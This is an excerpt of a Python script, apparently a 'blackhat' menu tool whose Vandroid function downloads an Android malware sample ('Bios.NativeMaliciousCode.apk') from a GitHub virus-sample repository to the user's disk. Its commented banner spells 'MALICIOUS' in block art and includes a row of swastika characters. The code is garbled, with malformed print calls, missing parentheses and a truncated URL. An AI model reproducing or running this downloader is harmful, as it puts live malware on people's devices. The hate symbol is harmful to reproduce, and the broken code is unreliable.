...
def banner():
    ...
    #print(""+R+"! "+C+"卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 "+C+"!")
    #print(""+R+"I "+C+"████╗ ████║██╔══██╗██║     ██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝ "+R+"I")
    #print(""+R+"R "+C+"██╔████╔██║███████║██║     ██║██║     ██║██║   ██║██║   ██║███████╗ "+R+"R")
#    print(""+R+"U "+C+"██║╚██╔╝██║██╔══██║██║     ██║██║     ██║██║   ██║██║   ██║╚════██║ "+R+"U")
#    print(""+R+"S "+C+"██║ ╚═╝ ██║██║  ██║███████╗██║╚██████╗██║╚██████╔╝╚██████╔╝███████║ "+R+"S")
...
def about():
        ...
        print("\tAuthor         : TheKingTermux\t\t\t")
        print("\tVersion Script : 4\t\t\t")
        print("\tVersion Author : 1\t\t\t")
        print("\tTeam"          : "IDN-BlackHat" + "NAC55")
        print("\t"+B+"Thanks to Use This Script")
        print("\t"+B+"This Script Have A COPYRIGHTED"
        print("\t"B+"This Script Is Copyrighted By GitHub"
        menu()
...
def Vandroid():
        ...
        try:
                ...
                if menu1 == 1:#############done
                        ...
                        print(""+G+"")
                        chunk_size = 1024
                        url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Bios.NativeMaliciousCode.apk?r                       >
                        r = requests.get(url, stream = True)
                        size = int(r.headers['content-length'])
                        filename = url.split('/')[-1]
                        with open(filename, 'wb') as f:
                        ...
                        print(fun)#####doneelif menu1 == 4:########done
                        print(""+G+"")
                        chunk_size = 1024
